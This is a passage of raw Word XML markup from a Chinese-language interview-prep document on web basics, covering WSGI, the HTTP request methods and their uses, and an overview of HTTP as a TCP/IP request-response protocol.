          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>等协议，用于接收</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>转发的动态请求，处理后发个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用程序</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C45D3FE" w14:textId="5067B714" w:rsidR="006B2B80" w:rsidRPr="00AD41B7" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing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WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：用在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django/Flask</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）编写的应用程序与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器之间的规范</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="65C945E6" w14:textId="713264FA" w:rsidR="006B2B80" w:rsidRPr="003A0200" w:rsidRDefault="00AD41B7" w:rsidP="003A02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0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>012</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求中常见的请求方式？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758B76F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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02610AC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HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议中共定义了八种方法（有时也叫</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>动作</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），来表明</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Request-URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>指定的资源不同的操作方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE81F2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注意：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6701173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）方法名称是区分大小写的，当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>405</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Mothod Not Allowed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）；当服务器不认识或者不支持对应的请求方法时，应返回状态码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>501</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Not Implemented</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE4218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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP服务器至少应该实现GET和HEAD/POST方法，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>其他方法都是可选的，此外除上述方法，特定的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器支持扩展自定义的方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="14424"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495"/>
        <w:gridCol w:w="11929"/>
      </w:tblGrid>
      <w:tr w:rsidR="006B2B80" w14:paraId="7F97BEDB"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DE6E047"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GET            </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7D36F262"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向特定的路径资源发出请求</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FFD9DB3"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注意：GET方法不应当被用于产生“副作用”的操作中，例如在WebApplication中，其中一个原因是GET可能会被网络蜘蛛等随意访问。Loadrunner中对应get请求函数：web_link和web_url</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="4810C2DF"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7B81C7CC"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POST</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3CDAE135"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向指定路径资源提交数据进行处理请求（一般用于提交表单或者上传文件）</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33FE9116"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数据被包含在请求体中，POST请求可能会导致新的资源的建立和/或已有资源的修改。Loadrunner中对应POST请求函数：web_submit_data,web_submit_form</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="7430EFFE"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4610C299"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lastRenderedPageBreak/>
              <w:t>    OPTIONS               </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C063C68"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返回服务器针对特定资源所支持的HTTP请求方法</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66480692"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允许客户端查看服务器的性能，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="328B4B56"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473E521"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HEAD</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3D29CE39"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向服务器索与GET请求相一致的响应，只不过响应体将不会被返回</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07D93322"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这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="16882578"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24D5ED9F"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PUT</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E09BC43"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从客户端向服务器传送的数据取代指定的文档的内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="32C34F81"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001218E1"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DELETE </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515130A0"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请求服务器删除指定的页面</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="5BA30EC0"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9CDE620"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TRACE</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B02206F"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回回显服务器收到的请求，主要用于测试或诊断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006B2B80" w14:paraId="6E9F841F" w14:textId="77777777" w:rsidTr="00AD41B7">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>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979C015" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="002437D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CONNECT</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6ECAA16B" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="002437D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HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A0CAD84" w14:textId="16D2C026" w:rsidR="00AD41B7" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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8E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>013</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谈谈你对</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>协议的认识</w:t>
      </w:r>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789C9C02" w14:textId="6D6580D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1.1 长连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B19F79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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一个属于应用层的面向对象的协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3BD6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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议工作于客户端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务端架构为上。浏览器作为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>客户端通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务端即</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WEB</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器发送所有请求。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器根据接收到的请求后，向客户端发送响应信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A22394" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="480"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>基于TCP/IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3BCE7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双方建立通信的顺序</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>以及</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面显示需要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理的步骤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等等。像这样把与互联网相关联的协议集合起来总称为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">       TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议是基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议之上的应用层协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346D76A4" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="104"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:ind w:left="480"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>基于请求－响应模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666D345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HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议规定</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求从客户端发出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>最后服务器端响应该请求并</w:t>
      </w:r>
      <w:r>
        <w:rPr>
